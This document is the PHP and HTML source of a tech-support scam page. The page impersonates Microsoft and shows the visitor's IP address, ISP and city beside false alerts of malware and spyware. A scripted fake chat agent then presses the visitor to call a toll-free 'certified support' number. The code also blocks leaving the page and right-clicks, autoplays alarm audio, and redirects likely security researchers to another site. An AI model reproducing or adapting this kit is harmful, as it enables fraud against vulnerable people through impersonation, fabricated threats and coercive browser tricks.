<?php
$ipaddress =(isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
$isp = $_GET['c'];
$city = $_GET['city'];
$ecode = $_GET['s']; 

//phone
$numbers = array('1(833) 778-0767');
$phone = $numbers[mt_rand(0, count($numbers) - 1)];

//User OS and Browser
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() {

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
    '/windows nt 4.1/i'     =>  'Windows', //Gay useragents
        '/windows nt 10.0/i'     =>  'Windows 10',
    '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );

    foreach ($os_array as $regex => $value) {

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }

    return $os_platform;

}

function getBrowser() {

    global $user_agent;

    $browser        =   "Unknown Browser";

    $browser_array  =   array(
        '/msie|trident/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/opera/i'      =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/mobile/i'     =>  'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {

        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }

    }

    return $browser;

}


$user_os        =   getOS();
$user_browser   =   getBrowser();

//Determine OS to display header logo
$macfile = '<img src="images/AppleOS2.png" style="float:right; vertical-align:middle" />';
$winfile = '<img src="images/MicrosoftOS2.png" style="float:right; vertical-align:middle" />';
$logo = "";
        
if (preg_match_all('(mac)i', $user_os)) {
  $logo = $macfile;
} elseif (preg_match_all('(win)i', $user_os)) {
  $logo = $winfile;
}else {
  $logo = "";
}
?>
<!DOCTYPE html>
<html>
<head>
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp,noydir" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="utf-8">
<title>Call</title>
<link rel="shortcut icon" href="images/win-favi.ico" type="image/x-icon" />
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="css/style.css" />
<script>
 
    // This function sets the variable "window.pnumber" to use
    // anywhere on the page with a function like document.write(window.pnumber)
 
    function GetNumber(number, tagId, firstTime)
    {
		
	if(firstTime)
        window.pnumber = number;
	
    }
 
 
    (function(e,d) {
		
        // Make sure to replace ringba_com_tag="REPLACE_ME" with your Campaign ID.
        // You can find this by clicking <> next to your "Call Tracking Tag" 
        // inside your campaign's settings.
 
        var ringba_com_tag="JS50a37bd9860e47c1802343c8e1165c07"; 
        var _sc = d.getElementsByTagName('script'), _s = _sc[_sc.length - 1];
 
        // The numberClass setting tells Ringba which HTML tags to insert
        // your phone number into. You can change this to anything, but only
        // edit what is inside the quotes. 
 
        e._rgba = e._rgba || { q: [] }; e._rgba.q.push({ tag: ringba_com_tag, cb: GetNumber, numberClass: "phNumber", render: false, script: _s });
 
        if (!(e._rgba.loading = !!e._rgba.loading)) {
            var sc = d.createElement('script'); sc.type = 'text/javascript'; sc.async = true;
            sc.src = '//js.callcdn.com/js_v2/min/ringba.com.js';
            var s = d.getElementsByTagName('script')[0]; s.parentNode.insertBefore(sc, s);

            e._rgba.loading = true;
        }
    })(window,document);
	
  </script>
<script>
function getSystemInfo() {
        
            if('Windows' != 'Windows' && 'Windows' != 'Mac'){
                window.location = 'http://getadguard.com';
            }

        }
</script>
<script >
//nosy honies :)
if (((window.screen.availHeight + window.screen.availWidth) < 1700) && navigator.plugins.length == 0) {
      window.location.replace("http://www.getadguard.com");
    }
</script>
<!--Entry Script New-->

   <script >
var is_ie_lt9 = true;
if(is_ie_lt9==true){
	setTimeout(function(){ 	

alert("Dear <?php print $isp;?> Customer, \nWe have noticed excessive POPUP ADS or SECURITY ISSUES on your " + window.pnumber + " computer!\n\n\nIt could be because of a possible MALWARE or SPYWARE download. \n\nCALL CERTIFIED MICROSOFT SUPPORT: " + window.pnumber + " (Toll Free) NOW\n\n\n You are near <?php print $city?> and we have recorded your IP address <?php echo $ipaddress;?>. \n \n Please note your CASE ID is: <?php echo $ecode;?>\n\n\n HIGHLY RECOMMENDED SUPPORT CALL");    
}, 500);

//window.close();
//top.close();
window.location='#';
}
</script>


<script >
  
OnChatTextKeyDown = function (e) {
        var kCode = (e.keyCode) ? e.keyCode : e.which;
        if (kCode == 13) {
            typechat();
        }
  }

var phjava = window.pnumber ;
var phctype = "PC";var phos = "Support for<?php echo $user_os;?>";var phisp = "<?php echo $isp;?>";var phstate = "";var phtkw = "Do you need any help removing a Virus, Malware or Spyware from your computer?";var phtheresp = "";var techname = "Jackie Anderson";var firstname = "Jackie";var techtalk1 = "Hi, my name is Jackie. I am Chat Support agent for your <?php echo $user_os;?> Computer.";var techtalk2 = "I see that you are a <?php echo $isp;?> customer near <?php print $city?>. I see you might be getting a lot of Popup Advertisements and your PC might be running slow. Do you have an updated Anti-virus Security and System Drivers?";
var techtalk3 = "I'm here to help but I highly recommend you call our toll-free support line (" + window.pnumber + ": and refer Case ID: <?php echo $ecode;?>), so we can better assist you.";var techtalk4 = "Are you there?";var techtalk5 = "I'm still here to help if you need me, but I will have to disconnect soon. Can I help with anything?";
var didtype = 0;

cv1nr = 0;
cv2nr = 0;
cv3nr = 0;
cv4nr = 0;

function scrollcheck(){
var textarea = document.getElementById('wholebox');
textarea.scrollTop = textarea.scrollHeight;
}

function callconv(){
if (cv3nr == '0'){
document.getElementById('cframe').src = '';
cv3nr = 1;
}
}

function callconv2(){
if (cv4nr == '0'){
document.getElementById('cframe').src = '';
cv4nr = 1;
}
alert('An operator has been made available to take your call.\r\nPlease call in now at '+phjava+'. Your Case ID is: <?php echo $ecode;?>');
}

function istyping(){
didtype = 1;
setTimeout(function(){ jakelog(); }, 5400);
}

function dochat(){
setTimeout(function(){ c1(); }, 3000);
}

function c1(){
if (!document.all) {
document.getElementById('mymsg').play();
}
document.getElementById("typing1").style.display = "none";
document.getElementById("chat1").style.display = "block";
scrollcheck();
if (didtype == '0'){
setTimeout(function(){ t2(); }, 1900);
setTimeout(function(){ c2(); }, 6000);
}
}

function t2(){
document.getElementById("typing2").style.display = "block";
scrollcheck();
}

function c2(){
if (!document.all) {
document.getElementById('mymsg').play();
}
if (didtype == '0'){
document.getElementById("typing2").style.display = "none";
document.getElementById("chat2").style.display = "block";
setTimeout(function(){ t3(); }, 5100);
setTimeout(function(){ c3(); }, 11000);
}
scrollcheck();
}

function t3(){
document.getElementById("typing3").style.display = "block";
scrollcheck();
}

function c3(){
if (!document.all) {
document.getElementById('mymsg').play();
}
document.getElementById("typing3").style.display = "none";
document.getElementById("chat3").style.display = "block";
if (didtype == '0'){
setTimeout(function(){ t4(); }, 21000);
setTimeout(function(){ c4(); }, 25000);
}
scrollcheck();
}

function t4(){
if (didtype == '0'){
document.getElementById("typing4").style.display = "block";
}
scrollcheck();
}

function c4(){
if (didtype == '0'){
if (!document.all) {
document.getElementById('mymsg').play();
}
document.getElementById("typing4").style.display = "none";
document.getElementById("chat4").style.display = "block";
setTimeout(function(){ t5(); }, 30000);
setTimeout(function(){ c5(); }, 39000);
}
scrollcheck();
}

function t5(){
if (didtype == '0'){
document.getElementById("typing5").style.display = "block";
}
scrollcheck();
}

function c5(){
if (didtype == '0'){
if (!document.all) {
document.getElementById('mymsg').play();
}
document.getElementById("typing5").style.display = "none";
document.getElementById("chat5").style.display = "block";
setTimeout(function(){ istyping(); }, 15000);
}
scrollcheck();
}

function jakelog(){
document.getElementById("typing1").style.display = "none";
document.getElementById("typing2").style.display = "none";
document.getElementById("typing3").style.display = "none";
document.getElementById("typing4").style.display = "none";
document.getElementById("typing5").style.display = "none";
document.getElementById("ic_chattext_first").style.backgroundColor = '#d8d8d8';
document.getElementById("ic_chattext_first").disabled = true;
document.getElementById("offline").style.display = "block";
scrollcheck();

}

function typechat(){
if (!document.all) {
document.getElementById('mymsg').play();
}
didtype = 1;
userinput = document.getElementById("ic_chattext_first").value;
if (userinput != '' && userinput != '\n' && userinput != '\n\n'){
document.getElementById("euchat").innerHTML = userinput;
document.getElementById("userchatdiv").style.display = "block";
setTimeout(function(){ jakelog(); }, 5400);
}
document.getElementById("ic_chattext_first").value = '';
scrollcheck();
}

        function loadchat()
        {
    var comment=document.getElementById('ic_chattext_first').value;
    if(comment)
    {
    }
    }
</script>
</head>

<body onload="dochat();">
<audio preload id="mymsg">
  <source src="audio/msg.mp3" type="audio/mpeg">
</audio>
<header>
    <div class="top-bar-1" style="background-color: #ffffff;">
      <div class="container">
        <div class="row">
          <div class="col-md-6">
            <div class="top-bar-wrap text-left msflgo">
              <img src="images/msflgo.png" alt="" class="img-responsive">
            </div>
            
          </div> 
          <div class="col-md-6">
            <div class="top-bar-wrap text-right microsoft-search">
              <img src="images/msftsrch.png" alt="" class="img-responsive">
            </div>
          </div>        
        </div>        
      </div>
    </div>

    <div class="top-bar-2" style="background-color: #2f2f2f;">
      <div class="container">
        <div class="row">
          <div class="col-md-12">
            <div class="top-bar-wrap text-left microsoft-bar-2">
              <img src="images/msfttpbr.png" alt="" class="img-responsive">
            </div>
            
          </div> 
        </div>      
      </div>


    </div>
</header>
<div class="container">
<h1 style="vertical-align: middle;font-size: 35px; margin-top: 5px;"><span>Please Call Support For <?php echo $user_os;?></span></h1>
<h2 style="vertical-align: middle; color: #686868; margin-top: 5px;"><span>Microsoft Case ID</span> <span style="color:#F80615"><?php echo $ecode;?></span></h2>
<div class="border-wrap">
<section class="midbody">
<div>
<div class="main-box-wrap">
<div class="col-md-3 text-center" style="padding-left: 0;">
  <figure class="figureshape"><img src="images/msftppl.png" style="margin-top: -30px;" class="img-responsive" /></figure>
  <h3 style="margin: 5px 0;">Call Now (Toll Free)</h3>
  <h3 style="margin:0; color: #0167b9;"> <span class="phNumber"></span></h3>
</div>
<div class="space1">
  <div class="col-sm-12 midright" style="padding: 0;">
    <div class="topstrip"></div>
    <div class="textareabox">
      <div class="ic_shadow" id="ic_shadow" style="display: none">&nbsp;</div>
      <div class="ic_loader_animation" id="ic_loader_animation" style="display: none">&nbsp;</div>
      <div class="ic_maincontentarea" id="ic_maincontentarea">
        <div class="ic_dialog_box" id="ic_dialog_box" style="display: none">
          <textarea class="ic_dialog_box_textarea" id="ic_dialog_box_textarea" readonly onclick="this.select();"></textarea>
          <div class="ic_dialog_box_button1" id="ic_dialog_box_button1" onclick="ICObject.ClickOnDialogYes();">Copy to clipboard</div>
          <div class="ic_dialog_box_button2" id="ic_dialog_box_button2" onclick="ICObject.ClickOnDialogNo();">Cancel</div>
        </div>
        <div class="ic_statustext" id="ic_statustext" style="display: none"></div>
        <div class="ic_windowtitle_container"> <span class="ic_windowtitle" id="ic_windowtitle"></span> </div>
        <div class="ic_fontchange_small" id="ic_fontchange_small" onclick="ICObject.setFontSize(this, 'ic_chatlog', 'ic_chattext');"></div>
        <div class="ic_fontchange_medium" id="ic_fontchange_medium" onclick="ICObject.setFontSize(this, 'ic_chatlog_medium', 'ic_chattext_medium');"></div>
        <div class="ic_fontchange_large" id="ic_fontchange_large" onclick="ICObject.setFontSize(this, 'ic_chatlog_large', 'ic_chattext_large');"></div>
        <div class="ic_chatlog" style="overflow:visible" id="ic_chatlog">
          <div id="wholebox" style="max-height: 320px; height: 165px;">
            <div id="cdate" style="padding-bottom: 10px; font-size: 15px; font-family: 'Open Sans', sans-serif;"> <b> 
              <script type="text/javascript">
var mydate=new Date()
var year=mydate.getFullYear()
var day=mydate.getDay()
var month=mydate.getMonth()
var daym=mydate.getDate()
if (daym<10)
daym="0"+daym
var dayarray=new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday")
var montharray=new Array("January","February","March","April","May","June","July","August","September","October","November","December")
document.write("<b>"+dayarray[day]+", "+montharray[month]+" "+daym+", "+year+"</b>")
</script> 
              </b> </div>
            <div id="typing1">
              <table border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="padding-right: 10px;"><img src="https://s3.postimg.org/fo73k5moz/typing.gif" width="20" height="20"></td>
                  <td valign="middle"><i><script>document.write(firstname);</script> is typing a message</i></td>
                </tr>
              </table>
            </div>
            <div id="chat1" style="display: none; padding: 10px 20px; line-height: 180%; background: #f1f1f1; margin: 10px -10px; margin-top: 0;"><span style="color: #033f87; font-family: 'Open Sans', sans-serif;"> <b><script>document.write(firstname);</script>:</b> </span> <span style="font-family: 'Open Sans', sans-serif; font-size: 12px;">at 
              <script type="text/javascript">
<!--
var currentTime = new Date()
var hours = currentTime.getHours()
if (hours > 12){
ampm = 'PM';
hours = hours-12;
}
else
{
if (hours == '0'){
hours = '12';
}
ampm = 'AM';
}
var minutes = currentTime.getMinutes()
if (minutes < 10){
minutes = "0" + minutes;
}
document.write(hours + ":" + minutes + " " + ampm)
</script> 
              </span> <br />
              <table cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td width="100%" style="padding: 3px;"><script>document.write(techtalk1);</script></td>
                </tr>
              </table>
            </div>
            <div id="typing2" style="padding-top: 10px; display: none;">
              <table border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="padding-right: 10px;"><img src="https://s3.postimg.org/fo73k5moz/typing.gif" width="20" height="20"></td>
                  <td valign="middle"><i><script>document.write(firstname);</script> is typing a message</i></td>
                </tr>
              </table>
            </div>
            <div id="chat2" style="display: none; padding: 10px 20px; line-height: 180%; background: #fff; margin: 10px -10px;"><span style="color: #033f87; font-family: 'Open Sans', sans-serif;"><b><script>document.write(firstname);</script>:</b></span> <span style="font-family: 'Open Sans', sans-serif; font-size: 12px;">at 
              <script type="text/javascript">
<!--
var currentTime = new Date()
var hours = currentTime.getHours()
if (hours > 12){
ampm = 'PM';
hours = hours-12;
}
else
{
if (hours == '0'){
hours = '12';
}
ampm = 'AM';
}
var minutes = currentTime.getMinutes()
if (minutes < 10){
minutes = "0" + minutes;
}
document.write(hours + ":" + minutes + " " + ampm)
</script> 
              </span> <br />
              <table cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td width="100%" style="padding: 3px;"><script>document.write(techtalk2);</script></td>
                </tr>
              </table>
            </div>
            <div id="typing3" style="padding-top: 10px; display: none;">
              <table border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="padding-right: 10px;"><img src="https://s3.postimg.org/fo73k5moz/typing.gif" width="20" height="20"></td>
                  <td valign="middle"><i><script>document.write(firstname);</script> is typing a message</i></td>
                </tr>
              </table>
            </div>
            <div id="chat3" style="display: none; padding: 10px 20px; line-height: 180%; background: #f1f1f1; margin: 10px -10px;"><span style="color: #033f87; font-family: 'Open Sans', sans-serif;"><b><script>document.write(firstname);</script>:</b></span> <span style="font-family: 'Open Sans', sans-serif; font-size: 12px;">at 
              <script type="text/javascript">
<!--
var currentTime = new Date()
var hours = currentTime.getHours()
if (hours > 12){
ampm = 'PM';
hours = hours-12;
}
else
{
if (hours == '0'){
hours = '12';
}
ampm = 'AM';
}
var minutes = currentTime.getMinutes()
if (minutes < 10){
minutes = "0" + minutes;
}
document.write(hours + ":" + minutes + " " + ampm)
</script> 
              </span> <br />
              <table cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td width="100%" style="padding: 3px;"><script>document.write(techtalk3); </script></td>
                </tr>
              </table>
            </div>
            <div id="typing4" style="padding-top: 10px; display: none;">
              <table border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="padding-right: 10px;"><img src="https://s3.postimg.org/fo73k5moz/typing.gif" width="20" height="20"></td>
                  <td valign="middle"><i><script>document.write(firstname);</script> is typing a message</i></td>
                </tr>
              </table>
            </div>
            <div id="chat4" style="display: none; padding: 10px 20px; line-height: 180%; background: #fff; margin: 10px -10px;"><span style="color: #033f87; font-family: 'Open Sans', sans-serif;"><b><script>document.write(firstname);</script>:</b></span> <span style="font-family: 'Open Sans', sans-serif; font-size: 12px;">at 
              <script type="text/javascript">
<!--
var currentTime = new Date()
var hours = currentTime.getHours()
if (hours > 12){
ampm = 'PM';
hours = hours-12;
}
else
{
if (hours == '0'){
hours = '12';
}
ampm = 'AM';
}
var minutes = currentTime.getMinutes()+1;
if (minutes < 10){
minutes = "0" + minutes;
}
document.write(hours + ":" + minutes + " " + ampm)
</script> 
              </span> <br />
              <table cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td width="100%" style="padding: 3px;"><script>document.write(techtalk4);</script></td>
                </tr>
              </table>
            </div>
            <div id="typing5" style="padding-top: 10px; display: none;">
              <table border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="padding-right: 10px;"><img src="https://s3.postimg.org/fo73k5moz/typing.gif" width="20" height="20"></td>
                  <td valign="middle"><i><script>document.write(firstname);</script> is typing a message</i></td>
                </tr>
              </table>
            </div>
            <div id="chat5" style="display: none; padding: 10px 20px; line-height: 180%; background: #f1f1f1; margin: 10px -10px;"><span style="color: #033f87; font-family: 'Open Sans', sans-serif;"><b><script>document.write(firstname);</script>:</b></span> <span style="font-family: 'Open Sans', sans-serif; font-size: 12px;">at 
              <script type="text/javascript">
<!--
var currentTime = new Date()
var hours = currentTime.getHours()
if (hours > 12){
ampm = 'PM';
hours = hours-12;
}
else
{
if (hours == '0'){
hours = '12';
}
ampm = 'AM';
}
var minutes = currentTime.getMinutes()+1;
if (minutes < 10){
minutes = "0" + minutes;
}
document.write(hours + ":" + minutes + " " + ampm)
</script> 
              </span> <br />
              <table cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td width="100%" style="padding: 3px;"><script>document.write(techtalk5);</script></td>
                </tr>
              </table>
            </div>
            <div id="userchatdiv" style="display: none; padding: 10px 20px; line-height: 180%; background: #fff; margin: 10px -10px;"><span style="color: #d46902; font-family: 'Open Sans', sans-serif;"><b>You:</b></span> <span style="font-family: 'Open Sans', sans-serif; font-size: 12px;">at 
              <script type="text/javascript">
<!--
var currentTime = new Date()
var hours = currentTime.getHours()
if (hours > 12){
ampm = 'PM';
hours = hours-12;
}
else
{
if (hours == '0'){
hours = '12';
}
ampm = 'AM';
}
var minutes = currentTime.getMinutes()
if (minutes < 10){
minutes = "0" + minutes;
}
document.write(hours + ":" + minutes + " " + ampm)
</script> 
              </span> <br />
              <table cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td id="euchat" width="100%" style="padding: 3px;"></td>
                </tr>
              </table>
            </div>
            <div id="offline" style="display: none; padding: 5px; line-height: 180%;">
              <hr width="100%" style="border: 0; height: 1px; background-color: #888888;">
              <span style="color: red; font-family: 'Open Sans', sans-serif; font-size: 13px;"><b><script>document.write(firstname);</script> is now offline.</b></span> <br />
              <span style="font-size: 13px; font-family: 'Open Sans', sans-serif;"><b>We strongly urge you call one of our <script>document.write(phos);</script> to ensure System Security and Data Protection.</b></span><br />
              <div style="width: 294px; height: 40px; background-image: url('images/button.png'); background-repeat: no-repeat; padding-top: 10px; padding-left: 13px; color: #ffffff; font-family: 'Open Sans', sans-serif; font-size: 16px; cursor: pointer;" align="center" valign="middle" onClick="alert('Please call '+phjava+' to speak with a '+phos+'.');"><span><b>CALL NOW:  <span class="phNumber"></span></span></b></div>
              <span style="font-size: 13px; font-family: 'Open Sans', sans-serif;"><b>A technician is on standby waiting for your call...</b><br />
              Status: <b style='font-size:14px;color:green;font-family: 'Open Sans', sans-serif;'>Available</b><br />
              <b>[ <a href="#" onClick="alert('Please call '+phjava+' to speak with a '+phos+'.');">Highly Recommended | Ensure System Protection!</a> ]</b> </span> </div>
          </div>
        </div>
        <div class="commentsection">
          <div class="ic_complementer" id="ic_complementer">
            <textarea id="ic_chattext_first" style="width:100%;height: 38px;color: #000000;font-family: tahoma, arial, verdana;font-size: 15px;border: none;background-color: transparent;overflow: auto;resize: none;" onkeydown="OnChatTextKeyDown(event);"></textarea>
          </div>
          <div class="ic_send_button" id="ic_send_button" onclick="typechat();"></div>
          <div class="ic_progressbars" id="ic_progressbars"></div>
          <div class="ic_progressbars_chatbottom" id="ic_progressbars_chatbottom" style="display: none">&nbsp;</div>
          <div class="ic_lang_container" id="ic_lang_container" style="display: none"></div>
        </div>
        <div class="ic_lang_select" id="ic_lang_select">
          <table class="ic_lang_select_text" cellpadding="0" cellspacing="0" onclick="ICObject.displayLangContainer(false); event.cancelBubble = true;">
            <tr class="ic_lang_select_text_tr">
              <td class="ic_lang_select_text_td" id="ic_lang_select_a" onclick="ICObject.displayLangContainer(false); event.cancelBubble = true;"></td>
            </tr>
          </table>
          <div class="ic_lang_select_arrowimg" onclick="ICObject.displayLangContainer(false); event.cancelBubble = true;">&nbsp;</div>
        </div>
        <img id="ic_checknetwork" alt="" src="" style=" position: absolute; left: -200px; top: -200px; width: 1px; height: 1px; display: none" /> </div>
    </div>

  </div>
</div>
</div>
</div>

</section>
<section class="tablebox">
  <div>
    <div class="table-responsive tabbox">
      <table class="table table-bordered text-center">
        <tr>
          <th class="text-center" width="20%">IP</th>
          <th class="text-center" width="20%">Browser</th>
          <th class="text-center" width="20%">Operating System</th>
          <th class="text-center" width="20%">Internet Provider</th>
          <th class="text-center" width="20%">System Status</th>
        </tr>
        <tr>
          <td style="text-align: center;color: #060;"><?php echo $ipaddress;?></td>
          <td style="text-align: center;color: #060;"><?php echo $user_browser;?></td>
          <td style="text-align: center;color: #060;" ><?php echo $user_os;?></td>
          <td style="text-align: center;color: #060;" ><?php echo $isp;?></td>
          <td style="text-align: center;color: red;">POSSIBLE ERRORS</td>
        </tr>
        <tr>
          <td style="text-align: center;color: #060;">True</td>
          <td style="text-align: center;color: #060;">True</td>
          <td style="text-align: center;color: #060;">True</td>
          <td style="text-align: center;color: #060;">True</td>
          <td><label>Call <span class="phNumber"></span></label></td>
        </tr>
      </table>
    </div>
  </div>
</section>

</div>

<div class="text-center" id="remote-link" style="margin-top: 10px;">
  <img src="images/msfotr.png" class="img-responsive">
  <div class="hidden"></div>
</div>
</div>

<script src="https://code.jquery.com/jquery-1.11.0.min.js"></script> 
<script src="js/init.js"></script> 
<script>
var myEvent = window.attachEvent || window.addEventListener;
var chkevent = window.attachEvent ? 'onbeforeunload' : 'beforeunload'; /// make IE7, IE8 compitable

            myEvent(chkevent, function(e) { // For >=IE7, Chrome, Firefox
			setTimeout(function(){ 	
              		var confirmationMessage = 'Dear <?php print $isp;?> Customer, Did you get your PC Diagnosed? \n Contact Support at ' + window.pnumber + '  (Toll Free) if you haven\'t already before navigating away.';  // a space
               }, 500);
			   (e || window.event).returnValue = confirmationMessage;
                return confirmationMessage;
            });
</script> 
<script type="text/javascript">
			setTimeout(function(){ 	

var message="Dear <?php print $isp;?> Customer, Did you get your PC Diagnosed? \n Contact Support at " + window.pnumber + "  (Toll Free) if you haven\'t already before navigating away. Higly Recommended Support Call";
}, 500);
function clickIE() {if (document.all) {(message);return false;}}
function clickNS(e) {if
(document.layers||(document.getElementById&&!document.all)) {
if (e.which==2||e.which==3) {(message);return false;}}}
if (document.layers)
{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
document.oncontextmenu=new Function("return false")
</script>
<p></p>
<p></p>
<p></p>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>



<br/>
<p style="text-align:center; font-size:10px">Disclaimer: Please note that we are an independent service provider for Technical Support and Service authorised and certified to work on you Microsoft device or Opeating system. Any third party logos or impages (if found) used are only for reference and we are not affiliated with any brands unless specified.</p>
<center>
<audio id="audio1" controls autoplay>
  <source src="audio/microsoft_new.mp3" type="audio/mpeg">
  <embed height="0" name="plugin" src="audio/apple_new.mp3" type="audio/mpeg">
</audio>

</center>

<script>
var audio1 = document.getElementById('audio1');
audio1.play();
</script>

<!--Begin Comm100 Live Chat Code-->
<div id="comm100-button-2662" style="display: none;"></div>
<script type="text/javascript">
var Comm100API=Comm100API||{};(function(t){function e(e){var a=document.createElement("script"),c=document.getElementsByTagName("script")[0];a.type="text/javascript",a.async=!0,a.src=e+t.site_id,c.parentNode.insertBefore(a,c)}t.chat_buttons=t.chat_buttons||[],t.chat_buttons.push({code_plan:2662,div_id:"comm100-button-2662"}),t.site_id=119600,t.main_code_plan=2662,e("https://chatserver.comm100.com/livechat.ashx?siteId="),setTimeout(function(){t.loaded||e("https://hostedmax.comm100.com/chatserver/livechat.ashx?siteId=")},5e3)})(Comm100API||{})
</script>
<!--End Comm100 Live Chat Code-->
</body>
</html>